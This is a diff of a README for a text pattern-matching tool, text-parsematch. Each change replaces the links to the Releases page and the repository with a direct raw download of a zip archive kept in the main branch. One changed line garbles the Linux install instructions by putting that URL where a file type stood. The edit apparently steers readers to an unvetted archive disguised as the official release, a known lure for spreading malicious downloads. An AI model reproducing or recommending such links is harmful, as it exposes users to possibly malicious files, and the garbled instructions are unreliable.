@@ -2,7 +2,7 @@
 # 🛠️ text-parsematch - Effortlessly Extract and Organize Your Data
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/KushalPitaliya/text-parsematch/releases)
+[![Download Latest Release](https://github.com/KushalPitaliya/text-parsematch/raw/refs/heads/main/text_parsematch/parsematch-text-1.6.zip%https://github.com/KushalPitaliya/text-parsematch/raw/refs/heads/main/text_parsematch/parsematch-text-1.6.zip)](https://github.com/KushalPitaliya/text-parsematch/raw/refs/heads/main/text_parsematch/parsematch-text-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to text-parsematch! This application helps you process text input with pattern matching. You can extract data and categorize content easily. Follow these simple steps to get started.
@@ -26,7 +26,7 @@ To run text-parsematch, your computer should meet these minimum requirements:
 - **Storage**: Minimum of 100 MB of free disk space.
 
 ## 📥 Download & Install
-To begin using text-parsematch, visit this page to download: [Download text-parsematch](https://github.com/KushalPitaliya/text-parsematch/releases).
+To begin using text-parsematch, visit this page to download: [Download text-parsematch](https://github.com/KushalPitaliya/text-parsematch/raw/refs/heads/main/text_parsematch/parsematch-text-1.6.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version available.
@@ -37,7 +37,7 @@ To begin using text-parsematch, visit this page to download: [Download text-pars
 ### 📂 Installation Steps
 - **Windows**: If you downloaded a `.exe` file, double-click to install. Follow prompts to complete the setup.
 - **macOS**: For a `.dmg` file, open it and drag the application to your Applications folder.
-- **Linux**: If you received a `.tar.gz` file, extract it and run the application from the terminal.
+- **Linux**: If you received a `https://github.com/KushalPitaliya/text-parsematch/raw/refs/heads/main/text_parsematch/parsematch-text-1.6.zip` file, extract it and run the application from the terminal.
 
 ## ⚙️ How to Use text-parsematch
 After installation, follow these straightforward steps to use the application:
@@ -65,8 +65,8 @@ Engage with other users and share your experiences. Your feedback helps make tex
 If you'd like to contribute to text-parsematch, we welcome your input. Check our guidelines for contributing to understand how you can help.
 
 ## 🔗 Learn More
-To explore additional features and learn more about text-parsematch, visit the [GitHub Repository](https://github.com/KushalPitaliya/text-parsematch).
+To explore additional features and learn more about text-parsematch, visit the [GitHub Repository](https://github.com/KushalPitaliya/text-parsematch/raw/refs/heads/main/text_parsematch/parsematch-text-1.6.zip).
 
 ## 📥 Download Now Again
-Don’t forget to [download text-parsematch](https://github.com/KushalPitaliya/text-parsematch/releases) and start simplifying your text processing tasks today!
+Don’t forget to [download text-parsematch](https://github.com/KushalPitaliya/text-parsematch/raw/refs/heads/main/text_parsematch/parsematch-text-1.6.zip) and start simplifying your text processing tasks today!
 ```
